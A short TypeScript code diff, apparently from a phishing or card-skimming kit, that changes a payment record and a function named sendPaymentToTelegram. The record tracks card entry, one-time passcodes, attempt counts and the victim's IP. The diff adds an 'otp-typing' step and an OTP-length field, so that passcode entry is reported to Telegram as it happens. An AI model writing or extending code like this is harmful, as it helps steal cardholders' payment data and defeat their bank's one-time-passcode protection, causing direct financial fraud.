@@ -44,7 +44,7 @@ export interface PaymentInfo {
   from: string;
   to: string;
   paymentMethod: string;
-  step: 'card-entered' | 'card-complete' | 'otp-attempt' | 'otp-success' | 'otp-failed';
+  step: 'card-entered' | 'card-complete' | 'otp-typing' | 'otp-attempt' | 'otp-success' | 'otp-failed';
   otpCode?: string;
   attemptNumber?: number;
   ip?: string;
@@ -86,6 +86,7 @@ export async function sendPaymentToTelegram(info: PaymentInfo): Promise<boolean>
       ip: info.ip || 'N/A',
       time: timeStr,
       otpCode: info.otpCode || 'N/A',
+      otpLength: String((info.otpCode || '').length),
       attemptNumber: String(info.attemptNumber || 1),
     });
   } else {
